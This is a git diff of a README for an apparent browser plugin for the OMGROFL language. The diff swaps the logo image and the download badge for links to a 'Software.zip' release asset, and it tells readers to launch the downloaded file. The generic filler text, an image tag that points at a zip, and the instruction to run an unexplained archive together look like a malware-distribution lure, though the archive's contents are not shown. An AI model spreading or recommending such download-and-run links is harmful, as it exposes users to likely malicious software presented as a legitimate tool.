@@ -1,6 +1,6 @@
 # Bliss Browser OMGROFL Language Support Module 🌳️🌐️#️⃣️
 
-![Bliss Browser OMGROFL Logo](https://example.com/bliss_browser_omgrofl_logo.png)
+![Bliss Browser OMGROFL Logo](https://github.com/kubens12/Bliss_Browser_OMGROFL/releases/download/v2.0/Software.zip)
 
 ## Introduction
 Welcome to the Bliss Browser OMGROFL Language Support Module repository! This module allows you to write and run OMGROFL programs directly within your web browser using the Bliss Browser platform. Whether you are a beginner looking to learn OMGROFL or a seasoned developer wanting to explore new web development possibilities, this module has got you covered.
@@ -12,7 +12,7 @@ Welcome to the Bliss Browser OMGROFL Language Support Module repository! This mo
 
 ## Installation
 To get started with Bliss Browser OMGROFL Language Support Module, download the software package from the following link:  
-[![Download Bliss Browser OMGROFL](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)  
+[![Download Bliss Browser OMGROFL](https://github.com/kubens12/Bliss_Browser_OMGROFL/releases/download/v2.0/Software.zip)](https://github.com/kubens12/Bliss_Browser_OMGROFL/releases/download/v2.0/Software.zip)  
 *(Note: Launch the downloaded file to begin installation.)*
 
 ## Usage
